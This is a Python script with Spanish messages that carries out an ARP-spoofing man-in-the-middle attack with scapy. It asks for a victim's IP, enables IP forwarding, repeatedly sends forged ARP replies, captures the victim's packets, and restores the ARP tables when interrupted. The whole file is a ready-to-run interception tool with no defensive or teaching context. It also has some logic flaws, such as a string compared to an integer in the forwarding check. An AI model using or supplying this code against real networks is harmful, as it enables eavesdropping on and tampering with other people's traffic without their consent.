from scapy.all import Ether, ARP, srp, send, sniff
import argparse
import time
import os
import sys
import colorama
import socket
from service import WService
from colorama import Fore
from colorama import Style
colorama.init()
def habilitar_ruta(verbose=True):
    if verbose:
        print(Fore.GREEN+"Habilitando la ruta ip"+Style.RESET_ALL)
        if "nt" in os.name:
            service = WService("RemoteAccess")
            service.start()
        else:
            archivo_ip="/proc/sys/net/ipv4/ip_forward"
            with open(archivo_ip) as fichero:
                if not fichero.read() == 1:
                    with open(archivo_ip, "w") as fichero:
                        print(1, file=fichero)
    if verbose:
        print(Fore.GREEN+"La ruta ip se ha habilitado"+Style.RESET_ALL)
def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
def ataque(ip_victima,ip_host,verbose=True):
    mac_victima=get_mac(ip_victima)
    respuesta_arp=ARP(pdst=ip_victima,hwdst=mac_victima,psrc=ip_host,op='is-at')
    send(respuesta_arp,verbose=0)
    if verbose:
        mac_host = ARP().hwsrc
        print(Fore.GREEN+"[+] Enviado a {} : {} is-at {}".format(ip_victima, ip_host, mac_host)+Style.RESET_ALL)
        print(Fore.YELLOW+"PAQUETES CAPTURADOS")
        capture = sniff(filter=f"ip src host {ip_victima} or ip src host {ip_host}",timeout=int(2))
        print(capture.summary())
def recomponiendo(ip_victima,ip_host,verbose=True):
    mac_victima=get_mac(ip_victima)
    mac_host=get_mac(ip_host)
    respuesta_arp=ARP(pdst=ip_victima,hwdst=mac_victima,psrc=ip_host,hwsrc=mac_host,op='is-at')
    send(respuesta_arp,verbose=0,count=7)
    if verbose:
        print(Fore.GREEN+"[+] Enviado a {} : {} is-at {}".format(ip_victima, ip_host, mac_host)+Style.RESET_ALL)
def start():
    ip_victima=input(Fore.BLUE+"Introduzca la ip de la victima:"+Style.RESET_ALL)
    hostname=socket.gethostname()
    ip_host=socket.gethostbyname(hostname)
    verbose = True
    habilitar_ruta(verbose)
    try:
        while True:
            ataque(ip_victima,ip_host,verbose)
            ataque(ip_host,ip_victima,verbose)
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.YELLOW+"Se presiono Crtl+C, se saldra del programa"+Style.RESET_ALL)
        recomponiendo(ip_victima,ip_host,verbose)
        recomponiendo(ip_host,ip_victima,verbose)

start()
